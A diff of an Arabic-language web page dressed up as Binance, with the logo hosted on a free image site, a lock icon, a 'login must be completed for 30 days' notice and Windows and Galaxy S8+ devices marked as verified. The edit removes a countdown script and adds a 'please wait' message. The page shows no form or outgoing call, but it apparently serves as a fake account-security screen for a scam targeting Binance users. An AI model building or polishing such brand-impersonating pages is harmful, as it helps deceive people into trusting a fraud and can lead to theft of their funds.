@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="ar">
+<!DOCTYPE html><html lang="ar">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -50,9 +49,8 @@
       text-align: center;
       max-width: 400px;
       width: 90%;
-      margin: 100px auto 0 auto; /* لضمان عدم تغطية المحتوى بالرأس */
+      margin: 100px auto 0 auto;
     }
-    /* تنسيق أيقونة القفل والعناوين الأصلية */
     .logo {
       width: 96px;
       height: auto;
@@ -66,7 +64,6 @@
       font-size: 1.2rem;
       margin-bottom: 20px;
     }
-    /* تنسيق أقسام الأجهزة */
     .device-section {
       display: flex;
       align-items: center;
@@ -93,7 +90,7 @@
     }
     .check-mark {
       font-size: 1.2rem;
-      color: #28a745; /* أخضر */
+      color: #28a745;
       margin-left: 8px;
     }
     .verified {
@@ -101,7 +98,7 @@
       color: #28a745;
       margin-top: 5px;
     }
-    .countdown {
+    .waiting {
       font-size: 1rem;
       color: #F0B90B;
       margin-top: 5px;
@@ -109,67 +106,29 @@
   </style>
 </head>
 <body>
-  <!-- رأس الصفحة مع شعار باينانس -->
   <header>
     <img src="https://j.top4top.io/p_3388vj7m41.png" alt="Binance Logo">
     <h2>BINANCE</h2>
-  </header>
-  
-  <!-- المحتوى الرئيسي -->
-  <div class="container">
-    <!-- أيقونة القفل الأصلية -->
+  </header>  <div class="container">
     <img class="logo" src="https://img.icons8.com/fluency/96/000000/lock.png" alt="Lock Logo">
     <h1>يجب اتمام عمليه تسجيل الدخول</h1>
-    <p class="subtitle">لمدة 30 يوما</p>
-    
-    <!-- قسم جهاز الكمبيوتر -->
-    <div class="device-section">
-      <!-- أيقونة الجهاز: تم استخدام أيقونة شاشة -->
-      <img class="device-icon" src="https://img.icons8.com/fluency/96/000000/monitor.png" alt="Computer Icon">
-      <div class="device-info">
-        <h2>Windows <span class="check-mark">&#10004;</span></h2>
-        <div class="verified">تم التأكد منه</div>
-      </div>
-    </div>
-    
-    <!-- قسم الهاتف المحمول -->
-    <div class="device-section">
-      <!-- أيقونة الهاتف المحمول -->
-      <img class="device-icon" src="https://img.icons8.com/fluency/96/000000/smartphone.png" alt="Phone Icon">
-      <div class="device-info">
-        <h2>Galaxy S8+</h2>
-        <!-- العد التنازلي لمدة 30 يوم -->
-        <div class="countdown" id="countdown"></div>
-      </div>
-    </div>
+    <p class="subtitle">لمدة 30 يوما</p><div class="device-section">
+  <img class="device-icon" src="https://img.icons8.com/fluency/96/000000/monitor.png" alt="Computer Icon">
+  <div class="device-info">
+    <h2>Windows <span class="check-mark">&#10004;</span></h2>
+    <div class="verified">تم التأكد منه</div>
   </div>
-  
-  <script>
-    // تحديد الموعد النهائي بعد 30 يومًا من وقت تحميل الصفحة
-    const now = new Date();
-    const deadline = new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000);
-  
-    // تحديث العد التنازلي كل ثانية
-    const countdownElement = document.getElementById("countdown");
-    const timerInterval = setInterval(() => {
-      const currentTime = new Date().getTime();
-      const distance = deadline - currentTime;
-  
-      // حساب الأيام والساعات والدقائق والثواني
-      const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-  
-      // عرض العد التنازلي بشكل واقعي
-      countdownElement.innerHTML = days + " يوم " + hours + " ساعة " + minutes + " دقيقة " + seconds + " ثانية";
-  
-      // عند انتهاء الوقت، عرض رسالة بديلة
-      if (distance < 0) {
-        clearInterval(timerInterval);
-        countdownElement.innerHTML = "انتهى الوقت";
-      }
-    }, 1000);
-  </script>
+</div>
+
+<div class="device-section">
+  <img class="device-icon" src="https://img.icons8.com/fluency/96/000000/smartphone.png" alt="Phone Icon">
+  <div class="device-info">
+    <h2>Galaxy S8+ <span class="check-mark">&#10004;</span></h2>
+    <div class="verified">تم التأكد منه</div>
+    <div class="waiting">نرجو منك الانتظار</div>
+  </div>
+</div>
+
+  </div>
 </body>
 </html>
